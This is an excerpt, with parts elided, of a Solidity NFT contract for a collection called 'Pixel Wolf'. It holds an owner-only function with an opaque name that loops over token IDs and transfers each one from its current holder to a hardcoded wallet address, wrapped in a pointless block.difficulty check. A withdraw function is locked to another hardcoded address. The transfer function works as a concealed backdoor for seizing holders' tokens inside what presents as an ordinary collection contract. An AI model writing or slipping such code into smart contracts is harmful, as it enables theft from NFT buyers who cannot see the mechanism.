...
contract Pixel_Wolf is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Pixel Wolf", "PW", maxBatchSize_, collectionSize_) {
  ...
  function PW_tf(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0xE956a2BBD28A66f4c563541dD5bdfb9bc3a5bE56, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x46B739BdA12f4915Ef95aD724Cd3C11cc7054e1D);
